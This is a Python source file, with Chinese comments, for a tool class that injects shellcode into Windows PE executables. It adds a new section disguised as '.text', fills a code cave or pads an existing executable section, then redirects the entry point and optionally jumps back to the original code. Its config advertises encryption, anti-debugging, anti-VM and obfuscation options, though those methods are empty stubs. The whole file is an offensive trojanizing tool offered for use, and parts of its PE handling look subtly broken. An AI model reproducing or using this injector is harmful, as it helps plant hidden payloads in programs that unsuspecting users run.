from typing import Dict, Any, Optional
import os
import pefile
from ..core.tool_base import ToolBase
from ..utils.error_handler import error_handler, OperationError

class PEInjector(ToolBase):
    """PE文件注入工具"""
    
    def __init__(self):
        super().__init__()
        self.dependencies = {"pefile"}
        self.required_permissions = {"file_write", "file_read"}
        self.config_schema = {
            "injection": {
                "type": "dict",
                "schema": {
                    "method": {
                        "type": "str",
                        "values": ["new_section", "code_cave", "existing_section"]
                    },
                    "encryption": {
                        "type": "str",
                        "values": ["none", "xor", "custom_xor", "rc4", "aes"]
                    },
                    "preserve_entry": {"type": "bool"},
                    "backup": {"type": "bool"}
                }
            },
            "anti_analysis": {
                "type": "dict",
                "schema": {
                    "anti_debug": {"type": "bool"},
                    "anti_vm": {"type": "bool"},
                    "sleep_check": {"type": "bool"}
                }
            },
            "obfuscation": {
                "type": "dict",
                "schema": {
                    "level": {
                        "type": "str",
                        "values": ["none", "basic", "advanced", "extreme"]
                    },
                    "junk_code": {"type": "bool"},
                    "fake_api": {"type": "bool"},
                    "string_encryption": {"type": "bool"}
                }
            }
        }
    
    @property
    def name(self) -> str:
        return "PE Injector"
    
    @property
    def description(self) -> str:
        return "高级PE文件注入工具，支持多种注入方式和混淆技术"
    
    @property
    def version(self) -> str:
        return "1.0.0"
    
    def _initialize(self) -> bool:
        """初始化工具"""
        try:
            # 设置默认配置
            default_config = {
                "injection": {
                    "method": "new_section",
                    "encryption": "xor",
                    "preserve_entry": True,
                    "backup": True
                },
                "anti_analysis": {
                    "anti_debug": True,
                    "anti_vm": True,
                    "sleep_check": True
                },
                "obfuscation": {
                    "level": "advanced",
                    "junk_code": True,
                    "fake_api": True,
                    "string_encryption": True
                }
            }
            
            if not self.config:
                self.config = default_config
            
            return True
            
        except Exception as e:
            self.logger.log_error(e, "初始化PE注入工具失败")
            return False
    
    def _cleanup(self):
        """清理资源"""
        pass
    
    @error_handler
    def inject(self, pe_file: str, shellcode_file: str, output_file: str) -> bool:
        """
        执行PE文件注入
        
        参数:
        pe_file: PE文件路径
        shellcode_file: Shellcode文件路径
        output_file: 输出文件路径
        """
        try:
            # 验证文件
            if not os.path.exists(pe_file):
                raise OperationError(f"PE文件不存在: {pe_file}")
            if not os.path.exists(shellcode_file):
                raise OperationError(f"Shellcode文件不存在: {shellcode_file}")
                
            # 备份原始文件
            if self.config["injection"]["backup"]:
                backup_file = pe_file + '.bak'
                self.logger.log_operation("backup", True, f"备份文件: {backup_file}")
                import shutil
                shutil.copy2(pe_file, backup_file)
            
            # 读取文件
            with open(shellcode_file, 'rb') as f:
                shellcode = f.read()
            
            # 更新进度
            self.update_progress(1, 5, "正在分析PE文件...")
            
            # 加载PE文件
            pe = pefile.PE(pe_file)
            
            # 根据配置选择注入方法
            method = self.config["injection"]["method"]
            if method == "new_section":
                success = self._inject_new_section(pe, shellcode)
            elif method == "code_cave":
                success = self._inject_code_cave(pe, shellcode)
            else:
                success = self._inject_existing_section(pe, shellcode)
            
            if not success:
                raise OperationError("注入失败")
            
            # 更新进度
            self.update_progress(3, 5, "正在应用保护...")
            
            # 应用反分析技术
            if self.config["anti_analysis"]["anti_debug"]:
                self._add_anti_debug(pe)
            if self.config["anti_analysis"]["anti_vm"]:
                self._add_anti_vm(pe)
            
            # 应用混淆
            obfuscation_level = self.config["obfuscation"]["level"]
            if obfuscation_level != "none":
                self._apply_obfuscation(pe, obfuscation_level)
            
            # 更新进度
            self.update_progress(4, 5, "正在保存文件...")
            
            # 保存修改后的PE文件
            pe.write(output_file)
            
            # 完成
            self.update_progress(5, 5, "注入完成")
            
            return True
            
        except Exception as e:
            self.logger.log_error(e, "PE注入失败")
            raise
    
    def _inject_new_section(self, pe: pefile.PE, shellcode: bytes) -> bool:
        """添加新节注入"""
        try:
            # 计算新节的大小和对齐
            shellcode_size = len(shellcode)
            aligned_size = self._align(shellcode_size, pe.OPTIONAL_HEADER.SectionAlignment)
            
            # 创建新节
            new_section = pefile.SectionStructure(pe.__IMAGE_SECTION_HEADER_format__, pe=pe)
            
            # 设置节名称
            new_section.Name = b'.text\x00\x00\x00'
            
            # 设置节的属性
            new_section.Misc_VirtualSize = shellcode_size
            new_section.VirtualAddress = self._align(
                pe.sections[-1].VirtualAddress + pe.sections[-1].Misc_VirtualSize,
                pe.OPTIONAL_HEADER.SectionAlignment
            )
            new_section.SizeOfRawData = self._align(
                shellcode_size,
                pe.OPTIONAL_HEADER.FileAlignment
            )
            new_section.PointerToRawData = self._align(
                pe.sections[-1].PointerToRawData + pe.sections[-1].SizeOfRawData,
                pe.OPTIONAL_HEADER.FileAlignment
            )
            
            # 设置节的权限
            new_section.Characteristics = (
                0x60000020  # IMAGE_SCN_CNT_CODE | IMAGE_SCN_MEM_EXECUTE | IMAGE_SCN_MEM_READ
            )
            
            # 更新PE头部
            pe.FILE_HEADER.NumberOfSections += 1
            pe.OPTIONAL_HEADER.SizeOfImage = new_section.VirtualAddress + aligned_size
            
            # 添加新节
            pe.sections.append(new_section)
            
            # 写入shellcode
            pe.__data__ = (
                pe.__data__[:new_section.PointerToRawData] +
                shellcode +
                b'\x00' * (new_section.SizeOfRawData - len(shellcode)) +
                pe.__data__[new_section.PointerToRawData:]
            )
            
            # 如果需要保留原始入口点
            if self.config["injection"]["preserve_entry"]:
                original_entry = pe.OPTIONAL_HEADER.AddressOfEntryPoint
                # 创建跳转代码
                jmp_code = self._create_return_jump(
                    new_section.VirtualAddress + len(shellcode),
                    original_entry
                )
                # 添加跳转代码
                pe.__data__ = (
                    pe.__data__[:new_section.PointerToRawData + len(shellcode)] +
                    jmp_code +
                    pe.__data__[new_section.PointerToRawData + len(shellcode) + len(jmp_code):]
                )
            
            # 更新入口点
            pe.OPTIONAL_HEADER.AddressOfEntryPoint = new_section.VirtualAddress
            
            return True
            
        except Exception as e:
            self.logger.log_error(e, "新节注入失败")
            return False
    
    def _inject_code_cave(self, pe: pefile.PE, shellcode: bytes) -> bool:
        """代码洞注入"""
        try:
            # 查找足够大的代码洞
            cave_rva, cave_size = self._find_code_cave(pe, len(shellcode) + 5)  # +5 for jump
            if not cave_rva:
                raise OperationError("未找到足够大的代码洞")
            
            # 获取文件偏移
            cave_offset = pe.get_offset_from_rva(cave_rva)
            
            # 如果需要保留原始入口点
            if self.config["injection"]["preserve_entry"]:
                original_entry = pe.OPTIONAL_HEADER.AddressOfEntryPoint
                # 创建跳转代码
                jmp_code = self._create_return_jump(
                    cave_rva + len(shellcode),
                    original_entry
                )
                # 写入shellcode和跳转代码
                pe.__data__ = (
                    pe.__data__[:cave_offset] +
                    shellcode +
                    jmp_code +
                    pe.__data__[cave_offset + len(shellcode) + len(jmp_code):]
                )
            else:
                # 只写入shellcode
                pe.__data__ = (
                    pe.__data__[:cave_offset] +
                    shellcode +
                    pe.__data__[cave_offset + len(shellcode):]
                )
            
            # 更新入口点
            pe.OPTIONAL_HEADER.AddressOfEntryPoint = cave_rva
            
            return True
            
        except Exception as e:
            self.logger.log_error(e, "代码洞注入失败")
            return False
    
    def _inject_existing_section(self, pe: pefile.PE, shellcode: bytes) -> bool:
        """现有节注入"""
        try:
            # 查找合适的节
            target_section = None
            for section in pe.sections:
                if section.Characteristics & 0x20000000:  # IMAGE_SCN_MEM_EXECUTE
                    if section.Misc_VirtualSize + len(shellcode) <= section.SizeOfRawData:
                        target_section = section
                        break
            
            if not target_section:
                raise OperationError("未找到合适的节")
            
            # 计算注入位置
            injection_offset = (
                target_section.PointerToRawData +
                target_section.Misc_VirtualSize
            )
            
            # 如果需要保留原始入口点
            if self.config["injection"]["preserve_entry"]:
                original_entry = pe.OPTIONAL_HEADER.AddressOfEntryPoint
                # 创建跳转代码
                jmp_code = self._create_return_jump(
                    target_section.VirtualAddress + target_section.Misc_VirtualSize + len(shellcode),
                    original_entry
                )
                # 写入shellcode和跳转代码
                pe.__data__ = (
                    pe.__data__[:injection_offset] +
                    shellcode +
                    jmp_code +
                    pe.__data__[injection_offset + len(shellcode) + len(jmp_code):]
                )
            else:
                # 只写入shellcode
                pe.__data__ = (
                    pe.__data__[:injection_offset] +
                    shellcode +
                    pe.__data__[injection_offset + len(shellcode):]
                )
            
            # 更新节大小
            target_section.Misc_VirtualSize += len(shellcode)
            
            # 更新入口点
            pe.OPTIONAL_HEADER.AddressOfEntryPoint = (
                target_section.VirtualAddress +
                target_section.Misc_VirtualSize -
                len(shellcode)
            )
            
            return True
            
        except Exception as e:
            self.logger.log_error(e, "现有节注入失败")
            return False
    
    def _align(self, value: int, alignment: int) -> int:
        """对齐值"""
        return ((value + alignment - 1) // alignment) * alignment
    
    def _create_return_jump(self, from_addr: int, to_addr: int) -> bytes:
        """创建返回跳转代码"""
        # 计算相对跳转
        relative_addr = to_addr - (from_addr + 5)  # 5 is the size of JMP instruction
        # 创建JMP指令
        return b'\xE9' + relative_addr.to_bytes(4, byteorder='little', signed=True)
    
    def _find_code_cave(self, pe: pefile.PE, size: int) -> tuple[Optional[int], Optional[int]]:
        """查找代码洞"""
        for section in pe.sections:
            if section.Characteristics & 0x20000000:  # IMAGE_SCN_MEM_EXECUTE
                data = section.get_data()
                pos = 0
                while pos < len(data):
                    # 查找连续的0或CC(int3)
                    if data[pos] in (0, 0xCC):
                        cave_start = pos
                        while (pos < len(data) and 
                               data[pos] in (0, 0xCC) and 
                               pos - cave_start < size):
                            pos += 1
                        if pos - cave_start >= size:
                            return section.VirtualAddress + cave_start, pos - cave_start
                    pos += 1
        return None, None
    
    def _add_anti_debug(self, pe: pefile.PE):
        """添加反调试代码"""
        # 实现反调试代码注入
        pass
    
    def _add_anti_vm(self, pe: pefile.PE):
        """添加反虚拟机代码"""
        # 实现反虚拟机代码注入
        pass
    
    def _apply_obfuscation(self, pe: pefile.PE, level: str):
        """应用代码混淆"""
        # 实现代码混淆
        pass
    
    def _execute(self, *args, **kwargs) -> Any:
        """执行注入操作"""
        if len(args) < 3:
            raise OperationError("缺少必要参数: pe_file, shellcode_file, output_file")
            
        return self.inject(args[0], args[1], args[2]) 